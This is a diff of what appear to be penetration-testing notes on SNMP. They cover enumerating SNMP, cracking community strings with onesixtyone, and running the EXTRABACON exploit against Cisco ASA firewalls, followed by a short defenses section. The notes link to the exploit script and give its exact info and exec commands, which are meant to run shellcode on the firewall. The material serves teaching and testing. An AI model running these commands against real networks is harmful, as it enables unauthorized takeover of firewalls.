@@ -23,12 +23,11 @@ Trap
 InformRequest 
 ```
 
-
-Steps- 
+Steps-
 * Get SNMP IP from Wireshark 
 * Use snmpcheck -t IP
 
-**Cracking SNMP community strings( if not set to "public") and **
+**Cracking SNMP community strings( if not set to "public")**
 
 	kali > onesixtyone 192.168.1.102 -c /usr/share/doc/onesixtyone/dict.txt
 
@@ -39,20 +38,21 @@ Steps-
 According to Cisco, this EXTRABACON exploit enables  attackers within the network and with the SNMP community string to execute code remotely on their firewalls. In essence, the appliance designed to protect our network is compromised making the entire network unsafe. Like so many other pieces of remote code execution malware, EXTRABACON takes advantage of a buffer overflow in the code of the affected device
 
 This exploit requires;
-**1. SNMP be enabled on the device
-2. Knowledge of the community string in any version of SNMP (v1,v2,v3)**
-**3. an attack with IPv4 packets only
-4. Access to a system residing on the interface to the firewall**
+1. SNMP be enabled on the device
+2. Knowledge of the community string in any version of SNMP (v1,v2,v3)
+3. an attack with IPv4 packets only
+4. Access to a system residing on the interface to the firewall
 
 Note : The EXTRABACON exploit is a python script that you can [download here](https://github.com/blahdidbert/extrabacon).
 
-**Using Extrabacon:  **
+**Using Extrabacon:**
 		
 	kali > ./extrabacon info -t 192.168.1.101 -c hackers-arise
 		This will return a file that we need in exec mode of EXTRABACON. Here, I have named that file OTW
 	kali > ./extrabacon_1.1.0.1.py exec -k OTW -t 192.168.1.101 -c hackers-arise --mode pass-enable
 		When the exploit is successful, it will execute the shellcode on the Cisco ASA firewall, giving the attacker complete control!
-				
+		
+
 #### Defenses
 Until Cisco releases a patch for this exploit, there are two best defenses you can apply for the time being-
 1. Make your SNMP community string long and complex
